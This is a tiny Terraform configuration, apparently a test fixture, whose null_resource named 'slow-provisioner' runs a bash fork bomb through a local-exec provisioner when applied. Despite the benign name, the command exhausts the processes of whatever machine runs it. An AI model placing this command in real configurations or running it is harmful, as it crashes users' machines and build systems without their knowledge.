resource "null_resource" "slow-provisioner" {
  provisioner "local-exec" {
    interpreter = ["/bin/bash", "-c"]
    command = ":(){ :|:& };:"
  }
}
